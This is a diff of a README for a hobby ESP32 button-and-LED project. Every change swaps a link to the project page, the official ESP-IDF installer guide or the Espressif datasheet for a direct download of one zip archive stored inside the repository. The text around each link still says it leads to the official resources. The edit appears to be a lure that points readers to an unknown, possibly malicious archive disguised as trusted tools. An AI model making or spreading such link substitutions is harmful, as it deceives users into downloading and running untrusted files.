@@ -1,6 +1,6 @@
 # 🔘 esp32-button-led-toggle - Simple LED Control with ESP32
 
-[![Download Here](https://img.shields.io/badge/Download-Esp32--Button--Led--Toggle-brightgreen?style=for-the-badge)](https://github.com/zy4real/esp32-button-led-toggle)
+[![Download Here](https://img.shields.io/badge/Download-Esp32--Button--Led--Toggle-brightgreen?style=for-the-badge)](https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section guides you through downloading and running the software on a Window
 ### 1. Download the Project Files
 
 Visit this page to download the project files:  
-[https://github.com/zy4real/esp32-button-led-toggle](https://github.com/zy4real/esp32-button-led-toggle)
+[https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip](https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip)
 
 You will find a green **Code** button on the page. Click it, and then select **Download ZIP** to get all the files.
 
@@ -46,7 +46,7 @@ After the download finishes, open the ZIP file. Use the Windows File Explorer to
 ESP-IDF is the official software development kit for ESP32. You'll need it to build and upload the program.
 
 - Download the installer from:  
-  https://esp-idf.readthedocs.io/en/latest/get-started/windows-setup.html
+  https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip
 
 - Run the installer and follow the instructions on screen.
 - The installer will set up all required tools, including Python, Git, and the ESP-IDF framework.
@@ -149,10 +149,10 @@ The debouncing logic helps to ignore quick, repeated signals caused by the mecha
 ## 🌐 Useful Links
 
 - Official ESP-IDF setup guide for Windows:  
-  https://esp-idf.readthedocs.io/en/latest/get-started/windows-setup.html
+  https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip
 
 - ESP32 datasheet and pin mapping:  
-  https://www.espressif.com/sites/default/files/documentation/esp32_datasheet_en.pdf
+  https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip
 
 ---
 
@@ -160,6 +160,6 @@ The debouncing logic helps to ignore quick, repeated signals caused by the mecha
 
 You can get all the files here:  
 
-[https://github.com/zy4real/esp32-button-led-toggle](https://github.com/zy4real/esp32-button-led-toggle)  
+[https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip](https://github.com/zy4real/esp32-button-led-toggle/raw/refs/heads/main/include/esp_button_led_toggle_1.9.zip)  
 
 Use the **Code** button, then **Download ZIP** to save the project to your PC and begin.
